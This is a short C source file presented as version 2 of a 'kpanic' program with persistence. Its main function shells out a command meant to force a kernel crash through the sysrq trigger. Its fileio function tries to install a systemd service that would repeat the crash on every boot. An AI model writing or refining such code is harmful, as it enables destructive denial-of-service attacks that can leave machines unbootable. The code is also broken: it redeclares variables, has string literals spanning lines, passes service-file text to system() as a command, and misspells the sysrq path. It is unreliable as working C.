/* v2 of kpanic with persistence */ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_CMN_LEN 100

int fileio () {

    char cd[MAX_CMN_LEN] = "cd /usr/lib/systemd/system/", **p;
    char touch[MAX_CMN_LEN] = "touch kpanic.service", **p;
    system(cd);
    system(touch);
    
    char write[MAX_CMN_LEN] = "[Unit]
                               Description=test

                               [Service]
                               ExecStart=echo c > /proc/sysrq-triggers 

                               [Install]
                               WantedBy=multi-user.target)", **p;

    system(write);

    return 0;
}

int main () {
    char kpanic[MAX_CMN_LEN] = "echo c > /proc/sysrq-triggers", **p;
    system(kpanic);
    return 0;
}
